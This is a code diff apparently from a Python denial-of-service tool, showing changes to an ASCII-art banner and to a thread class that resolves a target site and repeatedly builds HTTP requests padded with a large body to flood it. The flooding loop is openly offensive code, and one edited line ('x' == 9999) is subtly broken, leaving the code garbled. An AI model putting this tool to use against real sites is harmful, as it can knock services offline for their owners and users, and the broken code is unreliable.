@@ -43,15 +43,7 @@ print("\033[96m                                                                @
 print("\033[96m                                                                @          @     \033[0m")
 print("\033[95m                                                                @         @      \033[0m")
 print("\033[95m                                                                @ @ @ @  @        \033[0m")
-print("\033[33m                                                                                 \033[0m")
-print("\033[33m                                                                                \033[0m")
-print("\033[33m                                                                                \033[0m")
-print("\033[33m                                                                                 \033[0m")
-print("\033[33m                                                                             \033[0m")
-print("\033[33m                                                                             \033[0m")
-print("\033[33m                                                                             \033[0m")
-print("\033[33m                                                                             \033[0m")
-print("\033[33m                                                                              \033[0m")
+print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ\033[0m")
 
 class MyThread(Thread,):
     def __init__(self,SITE, DOS_TYPE):
@@ -61,8 +53,8 @@ class MyThread(Thread,):
         self.kill_received = False
     def run(self):
         while not self.kill_received:
-            server = socket.gethostbyname((*self.site)
-            post = 'x' * 9999
+            server = socket.gethostbyname(self.site)
+            post = 'x' == 9999
             file = '/'
 
             request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
